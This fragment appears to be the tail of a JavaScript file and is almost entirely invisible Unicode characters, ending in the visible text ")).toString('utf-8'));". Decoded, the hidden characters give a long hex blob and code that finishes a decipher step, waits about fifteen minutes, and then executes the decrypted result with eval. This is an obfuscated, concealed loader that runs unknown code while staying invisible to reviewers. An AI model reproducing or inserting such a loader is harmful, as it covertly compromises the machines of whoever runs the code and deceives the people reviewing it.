󠅓󠄩󠅖󠅒󠅑󠄤󠄣󠅖󠅓󠄣󠄢󠄣󠄢󠄢󠅖󠅔󠅓󠄥󠅑󠄩󠅔󠅓󠅔󠄦󠄧󠄩󠄤󠅒󠄥󠄡󠄤󠅑󠅑󠄣󠅖󠅕󠅒󠄡󠅓󠄨󠅑󠄠󠄧󠄩󠄥󠄨󠄤󠅕󠅔󠄦󠄠󠄤󠅓󠄧󠄣󠄤󠅑󠅕󠄩󠅑󠅔󠅖󠅒󠄥󠅔󠅓󠅕󠄣󠅓󠄦󠄦󠄩󠅑󠅒󠄧󠄢󠅔󠅕󠄢󠅕󠄥󠄢󠅑󠅓󠄤󠄩󠄣󠄤󠄩󠅕󠅒󠄩󠅖󠄨󠅓󠄦󠄡󠅒󠄦󠄡󠅑󠅔󠅕󠅓󠅖󠄧󠄧󠄦󠅓󠅕󠄦󠅒󠅒󠄤󠄦󠄥󠄡󠅕󠄨󠄤󠄢󠅖󠄥󠅖󠅕󠅓󠄡󠄠󠄤󠄨󠅔󠄤󠄧󠄢󠅔󠄥󠄦󠄦󠅔󠄥󠄡󠄣󠄢󠅕󠅑󠄡󠅕󠄣󠄩󠄨󠄠󠅕󠄡󠅕󠄡󠅒󠅓󠅒󠄡󠄤󠅓󠄢󠅖󠄧󠅑󠅕󠄤󠅕󠄦󠄡󠄩󠄠󠄦󠅖󠄠󠅔󠅕󠅒󠄨󠄧󠄥󠄤󠄩󠄧󠅓󠅖󠄨󠄧󠄤󠄡󠅓󠄧󠅑󠅒󠄩󠄤󠅕󠅖󠅕󠅓󠅕󠄢󠅖󠅔󠅕󠄥󠅓󠄡󠅖󠄤󠄥󠄤󠄥󠄩󠅔󠅓󠅔󠅖󠅒󠅕󠄧󠄦󠄠󠄠󠅒󠄦󠅕󠄩󠄨󠄠󠄤󠄧󠄤󠄢󠅒󠅔󠄦󠄡󠄨󠄩󠄨󠄨󠅕󠄣󠅒󠄨󠅖󠅓󠅕󠄣󠄡󠄠󠅒󠄡󠄨󠅑󠅖󠄦󠅒󠄡󠅑󠅓󠅔󠄠󠄩󠅒󠅕󠅑󠅔󠄨󠄨󠄠󠅔󠄧󠅔󠅕󠅔󠅑󠅔󠄩󠄡󠄢󠄧󠄠󠄧󠅔󠄤󠅑󠄣󠄤󠄠󠄦󠅑󠄡󠄦󠅓󠅓󠅖󠅓󠅒󠅖󠄢󠄢󠅔󠅖󠄣󠄣󠄥󠅑󠄥󠄨󠄢󠄢󠅑󠄤󠅔󠅒󠄧󠄧󠄣󠅔󠅔󠄦󠄣󠄡󠄨󠄠󠅔󠅓󠅒󠄩󠅕󠅑󠅔󠄧󠄥󠄡󠅕󠄨󠄢󠄤󠄣󠄩󠄧󠄠󠄣󠅔󠄤󠄠󠄢󠄡󠄩󠅓󠄥󠄦󠄡󠄧󠄨󠄢󠄦󠄢󠄠󠄠󠄤󠅔󠄥󠄤󠄨󠄧󠅖󠅕󠄤󠄥󠅓󠄨󠅑󠄥󠄤󠄠󠄢󠄤󠄤󠅔󠄦󠅑󠄡󠄦󠅒󠄣󠅖󠄥󠄢󠅒󠄧󠅖󠄤󠄢󠅓󠄩󠅕󠄡󠄥󠄣󠅔󠅒󠄧󠅑󠅕󠅑󠄣󠄧󠅖󠄣󠄠󠄣󠄧󠄨󠅑󠄥󠄢󠄠󠅑󠅒󠅒󠄤󠄧󠅕󠄡󠅔󠅖󠅑󠅓󠅓󠄩󠅓󠄩󠅓󠅕󠄡󠄤󠅑󠄨󠄤󠄡󠄢󠅓󠄨󠄩󠅖󠄥󠅓󠄤󠄨󠅑󠅑󠄢󠅓󠅖󠄨󠄩󠄨󠅖󠅖󠄠󠄤󠅖󠄣󠅑󠄥󠄡󠄥󠄢󠄢󠅔󠅕󠄣󠅕󠅑󠄤󠄩󠅓󠄩󠅓󠄠󠄥󠄠󠄤󠄥󠅑󠅖󠄨󠄢󠅖󠄩󠅑󠅖󠄧󠅑󠅒󠄡󠄥󠄢󠄢󠄦󠅔󠅑󠅕󠅕󠅕󠄠󠄡󠅖󠄥󠄠󠅔󠅒󠄥󠄦󠄨󠅕󠅓󠅓󠅒󠄠󠅖󠅓󠄤󠄢󠅖󠄣󠅓󠅔󠄤󠅑󠄤󠄩󠄨󠅕󠄠󠅓󠄠󠅖󠅔󠄠󠄥󠄥󠅖󠄩󠅔󠄥󠄡󠄨󠅑󠄨󠅔󠄩󠄩󠄨󠄧󠄦󠅖󠄤󠄩󠅒󠄦󠅑󠄦󠄡󠄧󠅒󠄣󠄠󠄨󠄣󠄧󠄡󠅖󠄤󠄤󠄡󠄤󠄡󠄤󠄤󠄡󠄠󠄧󠄩󠅕󠄩󠄨󠄤󠅔󠄢󠄦󠄡󠄩󠄠󠄠󠅕󠅒󠄣󠄠󠄧󠄦󠅓󠅒󠅕󠄩󠄨󠄤󠄥󠄨󠅔󠄨󠄧󠄧󠄤󠅑󠅖󠅓󠄢󠄤󠄨󠅑󠄩󠄣󠄨󠅔󠅕󠄥󠄢󠄩󠄨󠅑󠅔󠄧󠄠󠄨󠄧󠄣󠄥󠄥󠅕󠄩󠄧󠄥󠅒󠅕󠄩󠄣󠄠󠅓󠄢󠅖󠅑󠅑󠄧󠄦󠄤󠅓󠄦󠄠󠅖󠅑󠄩󠄢󠅓󠅖󠅓󠄥󠅒󠅒󠄥󠄢󠅒󠄩󠄡󠄣󠅑󠅕󠄥󠅕󠄠󠄥󠅔󠄩󠄧󠄩󠄧󠅔󠅑󠄩󠄢󠄢󠄠󠄤󠅕󠄡󠅖󠄩󠄠󠅓󠄣󠄠󠅖󠄩󠄨󠅓󠅔󠄤󠅖󠅔󠄠󠄣󠄦󠅖󠅔󠅒󠅓󠄤󠅓󠄩󠄩󠄠󠄦󠄤󠅓󠅕󠄣󠄦󠅖󠄡󠄧󠅓󠅓󠅔󠄠󠅑󠅖󠅖󠄣󠄡󠅓󠅖󠄣󠅓󠅕󠄢󠄡󠄢󠄧󠄢󠄣󠄠󠄢󠄩󠅔󠄤󠅑󠄤󠅕󠄡󠅔󠅑󠄥󠄢󠄣󠅖󠄤󠅖󠅓󠄠󠄧󠅔󠅕󠅔󠄥󠄦󠅕󠄦󠄥󠅕󠄩󠄡󠄢󠅑󠄡󠄤󠄠󠄥󠅓󠅖󠄠󠅔󠄦󠄩󠅑󠄠󠄢󠅕󠅖󠅔󠄥󠅓󠄩󠄩󠄨󠄧󠄧󠄣󠄣󠄦󠅖󠄨󠅕󠅒󠅑󠄩󠄦󠄡󠅑󠄧󠅑󠄣󠅖󠅔󠄩󠅓󠄣󠄩󠄨󠄣󠅔󠄥󠄡󠄣󠄥󠄨󠄡󠄣󠄧󠄤󠅖󠅔󠅔󠄨󠄥󠄥󠅖󠅖󠄧󠅔󠄠󠅑󠄣󠅖󠄥󠄧󠄠󠄧󠅒󠄣󠅓󠄤󠅑󠄤󠅖󠄗󠄜󠄗󠅘󠅕󠅨󠄗󠄜󠄗󠅥󠅤󠅖󠄨󠄗󠄙󠄫󠅒󠄛󠄭󠅔󠄞󠅖󠅙󠅞󠅑󠅜󠄘󠄗󠅥󠅤󠅖󠄨󠄗󠄙󠄫󠅩󠅙󠅕󠅜󠅔󠄐󠅞󠅕󠅧󠄐󠅀󠅢󠅟󠅝󠅙󠅣󠅕󠄘󠅢󠄭󠄮󠅣󠅕󠅤󠅄󠅙󠅝󠅕󠅟󠅥󠅤󠄘󠅢󠄜󠄩󠅕󠄥󠄙󠄙󠄫󠅩󠅙󠅕󠅜󠅔󠄐󠅕󠅦󠅑󠅜󠄘󠅒󠄙󠄫󠅭󠄙󠄘󠄙󠅍󠅋󠄠󠅍󠄞󠅤󠅘󠅕󠅞󠄘󠄘󠄙󠄭󠄮󠅫󠅭󠄙󠄫`)).toString('utf-8'));